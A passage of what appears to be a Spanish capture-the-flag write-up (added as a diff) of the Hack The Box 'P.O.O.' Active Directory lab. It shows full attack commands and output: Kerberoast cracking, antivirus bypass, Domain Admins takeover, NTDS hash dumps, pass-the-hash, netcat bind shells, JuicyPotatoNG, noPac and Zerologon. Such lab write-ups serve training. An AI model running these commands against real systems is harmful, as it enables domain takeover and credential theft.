fc8ecb070fb7aa58d16834882a8c46ddd482f05309f155930655fc4ffc8a0f858ec3547fed91543a0fc7322bfc6cdd77cb2f2a3e247a0141013067dbe18a70ae503b3b786bb9ee8da952dfd01e50f1ef8cd9e2dc9e108e9116a46999ebc18ac32b734e5836207004ab19108d96daebe08d7be905fcb441967bb64e531dcbd05f49ee5dc8639298b0baf63a680b0ddb47bb76d21058a615e40d6000287765e214d4c7d9cd06acbd731430d44dc3c8c15950f3870eca20593c60122327e688f3bb2fae48a37171975b21ebd31  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente el <code class="language-plaintext highlighter-rouge">diccionario</code> rockyou no nos servira pero si utilizamos el diccionario de antes conseguimos la contraseña del usuario <code class="language-plaintext highlighter-rouge">p00_adm</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Keyboard-Combinations.txt hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">ZQ!5t4r </span><span class="p">         (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos a <code class="language-plaintext highlighter-rouge">bloodhound</code> y buscando caminos cortos para ser <code class="language-plaintext highlighter-rouge">Domain Admins</code> encontramos que el grupo <code class="language-plaintext highlighter-rouge">P00 HELP DESK</code> al cual pertenece el usuario <code class="language-plaintext highlighter-rouge">p00_adm</code> tiene el privilegio <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code> que queremos</p>
+<a href="/endgames/poo/3.png" target="_blank"><div><p><img src="/endgames/poo/3.png"></p></div></a>   
+
+<p class="plain-text">Para la explotación podemos dar clic derecho en GenericAll y <code class="language-plaintext highlighter-rouge">Help</code>, en la pestaña <code class="language-plaintext highlighter-rouge">Abuse Info</code> encontramos información de en que consiste y como <code class="language-plaintext highlighter-rouge">explotarlo</code></p>
+<a href="/endgames/poo/4.png" target="_blank"><div><p><img src="/endgames/poo/4.png"></p></div></a>   
+
+<p class="plain-text">Iniciamos por subir el <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a> con <code class="language-plaintext highlighter-rouge">upload</code> e importarlo, sin embargo al hacerlo nos dice que ha sido <code class="language-plaintext highlighter-rouge">bloqueado</code> por el <code class="language-plaintext highlighter-rouge">antivirus</code> por contenido malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">PowerView.ps1
+</span><span class="az">
+Info: Uploading PowerView.ps1 to C:\Users\Administrator\Documents\PowerView.ps1
+</span><span class="sa">
+Data: 1027036 bytes of 1027036 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1
+</span><span class="ro">At C:\Users\Administrator\Documents\PowerView.ps1:1 char:1
++ #requires -version 2
++ ~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.  
+At C:\Users\Administrator\Documents\PowerView.ps1:1 char:1
++ #requires -version 2
++ ~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar la función <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code> incluida en <code class="language-plaintext highlighter-rouge">evil-winrm</code> y ahora al importar el <code class="language-plaintext highlighter-rouge">modulo</code> lo hace sin problemas y no tenemos problemas con el <code class="language-plaintext highlighter-rouge">antivirus</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Bypass-4MSI
+</span><span class="az">
+Info: Patching 4MSI, please be patient...
+</span><span class="ve">
+[+] Success!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Siguiendo las instrucciones en <code class="language-plaintext highlighter-rouge">bloodhound</code> iniciamos definiendo las <code class="language-plaintext highlighter-rouge">credenciales</code> del usuario <code class="language-plaintext highlighter-rouge">p00_adm</code> que hemos conseguido a traves del <code class="language-plaintext highlighter-rouge">kerberoasting</code> attack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'ZQ!5t4r' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'intranet.poo\p00_adm'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora añadimos al usuario <code class="language-plaintext highlighter-rouge">p00_adm</code> a <code class="language-plaintext highlighter-rouge">Domain Admins</code> aprovechando el privilegio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Add-DomainGroupMember </span><span class="c1">-Identity </span><span class="az">'Domain Admins' </span><span class="c1">-Members </span><span class="az">'p00_adm' </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con la <code class="language-plaintext highlighter-rouge">credencial</code> de p00_adm que tenemos definida deberiamos de poder invocar un <code class="language-plaintext highlighter-rouge">comando</code> indicando como objetivo el <code class="language-plaintext highlighter-rouge">DC</code>, este se ejecuta como <code class="language-plaintext highlighter-rouge">p00_adm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">whoami</span><span class="p"> }  
+poo\p00_adm
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora simplente buscamos de manera recursiva la <code class="language-plaintext highlighter-rouge">flag</code> que esta en el escritorio del usuario <code class="language-plaintext highlighter-rouge">mr3ks</code> y la leemos, aunque aun no conseguimos una shell interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">dir </span><span class="p">C:\Users </span><span class="c1">-recurse </span><span class="p">flag.txt }
+
+    Directory: C:\Users\mr3ks\Desktop
+
+Mode                LastWriteTime         Length Name              PSComputerName
+----                -------------         ------ ----              --------------
+-a----       26/03/2018     17:47             37 flag.txt          dc
+
+PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">type </span><span class="p">C:\Users\mr3ks\Desktop\flag.txt }  
+POO{1196ef8bc523f084ad1732a38a0851d6}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos comprobar que las credenciales de <code class="language-plaintext highlighter-rouge">p00_adm</code> son validas y como somos <code class="language-plaintext highlighter-rouge">Domain Admins</code> también dumpeamos los hashes del <code class="language-plaintext highlighter-rouge">ntds</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb intranet.poo -u p00_adm -p </span><span class="am">'ZQ!5t4r'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:DC) (domain:intranet.poo) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ve">[+] </span><span class="p">intranet.poo\p00_adm:ZQ!5t4r </span><span class="am">(Pwn3d!)
+
+</span><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb intranet.poo -u p00_adm -p </span><span class="am">'ZQ!5t4r'</span><span class="p"> --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:DC) (domain:intranet.poo) (signing:True) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ve">[+] </span><span class="p">intranet.poo\p00_adm:ZQ!5t4r </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:4f53a926429fd0e53776ab738b1bccc4:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f2d5bbdb13be8f3861588493350df289:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">mr3ks:1000:aad3b435b51404eeaad3b435b51404ee:1f989b7c5df25598ad816e342f69e090:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">p00_hr:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">p00_dev:1106:aad3b435b51404eeaad3b435b51404ee:89e178b8eabf074173edb164fb385ad4:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">p00_adm:1107:aad3b435b51404eeaad3b435b51404ee:a28543372c65db507ce6c266e192594e:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">DC$:1001:aad3b435b51404eeaad3b435b51404ee:561b89eaff4f6c4c7a6ebf8ed7e7385e:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">COMPATIBILITY$:1104:aad3b435b51404eeaad3b435b51404ee:bb426464bbe7a8ad0d158c587dcfaf64:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo importante a tener en cuenta es que aunque tenemos el <code class="language-plaintext highlighter-rouge">hash</code> NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> la cuenta de este usuario esta <code class="language-plaintext highlighter-rouge">deshabilitada</code> en el dominio
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb intranet.poo -u Administrator -H 4f53a926429fd0e53776ab738b1bccc4
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:DC) (domain:intranet.poo) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="sa">[-] </span><span class="p">intranet.poo\Administrator:4f53a926429fd0e53776ab738b1bccc4 STATUS_ACCOUNT_DISABLED</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora como el usuario <code class="language-plaintext highlighter-rouge">mr3ks</code> o como cualquier usuario <code class="language-plaintext highlighter-rouge">administrador</code> del dominio como <code class="language-plaintext highlighter-rouge">p00_adm</code> nos podemos conectar por winrm al <code class="language-plaintext highlighter-rouge">DC</code> haciendo un <code class="language-plaintext highlighter-rouge">passthehash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i intranet.poo -u mr3ks -H 1f989b7c5df25598ad816e342f69e090  
+PS C:\Users\mr3ks\Documents> </span><span class="am">whoami</span><span class="p">
+poo\mr3ks
+PS C:\Users\mr3ks\Documents> </span><span class="am">hostname</span><span class="p">
+DC
+PS C:\Users\mr3ks\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\flag.txt
+POO{1196ef8bc523f084ad1732a38a0851d6}
+PS C:\Users\mr3ks\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">O también podemos hacer uso de <code class="language-plaintext highlighter-rouge">psexec</code> con las credenciales para obtener una shell en el <code class="language-plaintext highlighter-rouge">DC</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con maximos privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q impacket-psexec intranet.poo/p00_adm:</span><span class="am">'ZQ!5t4r'</span><span class="p">@intranet.poo  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on intranet.poo.....
+[*] Found writable share ADMIN$
+[*] Uploading file WudsKinB.exe
+[*] Opening SVCManager on intranet.poo.....
+[*] Creating service zzeo on intranet.poo.....
+[*] Starting service zzeo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">hostname</span><span class="p">
+DC
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\mr3ks\Desktop\flag.txt
+POO{1196ef8bc523f084ad1732a38a0851d6}
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra1">
+<br><h3 class="post-title">Extra 1</h3>
+<h4 class="post-title">SeImpersonatePrivilege - Compatibility Administrator</h4><br>
+
+<p class="plain-text">Como alternativa en mssql podemos usar un <a href="https://github.com/blackarrowsec/mssqlproxy">proyecto</a> que nos permite crear un <code class="language-plaintext highlighter-rouge">proxy</code> a través de la conexion <code class="language-plaintext highlighter-rouge">mssql</code>, para ello usaremos la version modificada de <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> iniciamos ejecutando <code class="language-plaintext highlighter-rouge">enable_ole</code> y subiendo el <code class="language-plaintext highlighter-rouge">reciclador.dll</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">mssqlclient.py intranet.poo/pwned:password123#@10.13.38.11
+Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
+[!] Press help for extra shell commands
+SQL> enable_ole
+SQL> upload reciclador.dll C:\ProgramData\reciclador.dll
+[+] Uploading 'reciclador.dll' to 'C:\ProgramData\reciclador.dll'...
+[+] Size is 111616 bytes
+[+] Upload completed
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora procederemos a instalar el archivo <code class="language-plaintext highlighter-rouge">assembly.dll</code>, esto usando los parametros <code class="language-plaintext highlighter-rouge">-install</code> y <code class="language-plaintext highlighter-rouge">-clr</code> para indicarlo, estos parametros son parte del proyecto modificado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">mssqlclient.py intranet.poo/pwned:password123#@10.13.38.11 -install -clr assembly.dll  
+Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
+[*] Proxy mode: install
+[*] CLR enabled
+[*] Assembly successfully installed
+[*] Procedure successfully installed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente inciamos el <code class="language-plaintext highlighter-rouge">reciclador</code> indicando la ruta del dll, al correrlo este nos abre un <code class="language-plaintext highlighter-rouge">proxy</code> el puerto <code class="language-plaintext highlighter-rouge">1337</code> que podemos indicar en la configuracion de proxychains</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">mssqlclient.py intranet.poo/pwned:password123#@10.13.38.11 -start -reciclador </span><span class="am">'C:\ProgramData\reciclador.dll'  </span><span class="p">
+Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
+[*] Proxy mode: check
+[*] Assembly is installed
+[*] Procedure is installed
+[*] reciclador is installed
+[*] clr enabled
+[*] Proxy mode: start
+[*] Listening on port 1337...
+[*] ACK from server!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que no tenemos conexion podemos aprovechar esta version de <code class="language-plaintext highlighter-rouge">mssqlclient</code> modificada usando su función <code class="language-plaintext highlighter-rouge">upload</code> para subir <code class="language-plaintext highlighter-rouge">netcat.exe</code> y asi ganar una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> upload netcat.exe C:\ProgramData\netcat.exe
+[+] Uploading 'netcat.exe' to 'C:\ProgramData\netcat.exe'...  
+[+] Size is 43696 bytes
+[+] Upload completed
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> ejecutamos el <code class="language-plaintext highlighter-rouge">netcat.exe</code> para que inicie un listener en el puerto <code class="language-plaintext highlighter-rouge">4444</code> y cuando reciba una conexion devuelva una <code class="language-plaintext highlighter-rouge">powershell</code> interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell C:\ProgramData\netcat.exe -e powershell -lvnp 4444  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente aprovechando el <code class="language-plaintext highlighter-rouge">proxy</code> que creamos antes podemos conectarnos a la maquina y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> interactiva como la cuenta de <code class="language-plaintext highlighter-rouge">servicio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q netcat compatibility.intranet.poo 4444
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\System32> </span><span class="am">whoami</span><span class="p">
+nt service\mssql$poo_public
+PS C:\Windows\System32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La shell de mssql como cuenta de servicio tiene habilitado <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> el cual nos sirve para suplantar a cualquier usuario incluido <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\System32> </span><span class="am">whoami</span><span class="p">
+nt service\mssql$poo_public
+PS C:\Windows\System32> </span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========  
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+PS C:\Windows\System32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Y aunque realmente no nos aporta nada ya que somos <code class="language-plaintext highlighter-rouge">Administrator</code> podemos usar <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a> para ejecutar <code class="language-plaintext highlighter-rouge">netcat.exe</code> para dejar un listener en el puerto <code class="language-plaintext highlighter-rouge">4444</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\JuicyPotatoNG.exe </span><span class="c1">-t </span><span class="p">*</span><span class="c1"> -p </span><span class="p">C:\ProgramData\netcat.exe </span><span class="c1">-a</span><span class="az"> '-e powershell -lvnp 4444'  
+</span><span class="p">
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
+[+] CreateProcessAsUser OK
+[+] Exploit successful!
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos al puerto esta vez nos da una powershell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q netcat compatibility.intranet.poo 4444
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\> </span><span class="am">hostname</span><span class="p">
+COMPATIBILITY
+PS C:\></span>
+</code></pre></div></div><br>
+
+<section class="post" id="extra2">
+<br><h3 class="post-title">Extra 2</h3>
+<h4 class="post-title">CVE-2021-42278 / CVE-2021-42287 - DC Administrator</h4><br>
+
+<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a>, al explotarlo indicando el parametro <code class="language-plaintext highlighter-rouge">-shell</code> nos otorgara una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> directamente en el <code class="language-plaintext highlighter-rouge">DC</code>, sin embargo es importante indicar un usuario admin que no sea <code class="language-plaintext highlighter-rouge">Administrator</code> ya que esta deshabilitado, podemos indicar simplemente suplantar a <code class="language-plaintext highlighter-rouge">mr3ks</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q python3 noPac.py intranet.poo/p00_dev:Development1! -use-ldap -shell -dc-ip 172.20.128.53 --impersonate mr3ks  
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target dc.intranet.poo
+[*] will try to impersonate mr3ks
+[*] Adding Computer Account "WIN-VKPDAND9FI1$"
+[*] MachineAccount "WIN-VKPDAND9FI1$" password = nKCK**5iG*PI
+[*] Successfully added machine account WIN-VKPDAND9FI1$ with password nKCK**5iG*PI.
+[*] WIN-VKPDAND9FI1$ object = CN=WIN-VKPDAND9FI1,CN=Computers,DC=intranet,DC=poo
+[*] WIN-VKPDAND9FI1$ sAMAccountName == dc
+[*] Saving a DC's ticket in dc.ccache
+[*] Reseting the machine account to WIN-VKPDAND9FI1$
+[*] Restored WIN-VKPDAND9FI1$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating mr3ks
+[*] 	Requesting S4U2self
+[*] Saving a user's ticket in mr3ks.ccache
+[*] Rename ccache to mr3ks_dc.intranet.poo.ccache
+[*] Attempting to del a computer with the name: WIN-VKPDAND9FI1$
+[-] Delete computer WIN-VKPDAND9FI1$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra3">
+<br><h3 class="post-title">Extra 3</h3>
+<h4 class="post-title">CVE-2020-1472 - DC Administrator</h4><br>
+
+<p class="plain-text">Como alternativa podemos ejecutar la vuln de <a href="https://github.com/dirkjanm/CVE-2020-1472">zerologon</a> hacia el DC, el servidor es vulnerable y logramos cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> del equipo por una cadena vacia</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q python3 cve-2020-1472-exploit.py DC 172.20.128.53
+Performing authentication attempts...
+==========================================================================  
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Autenticandonos como el equipo <code class="language-plaintext highlighter-rouge">DC$</code> con una cadena vacia como contraseña podemos hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> y ver los hashes NT de todos los usuarios del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb intranet.poo -u DC$ -p </span><span class="am">'' </span><span class="p">--ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:DC) (domain:intranet.poo) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ve">[+] </span><span class="p">intranet.poo\DC$: 
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:4f53a926429fd0e53776ab738b1bccc4:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f2d5bbdb13be8f3861588493350df289:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">mr3ks:1000:aad3b435b51404eeaad3b435b51404ee:1f989b7c5df25598ad816e342f69e090:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">p00_hr:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="am">p00_dev:1106:aad3b435b51404eeaad3b435b51404ee:89e178b8eabf074173edb164fb385ad4:::
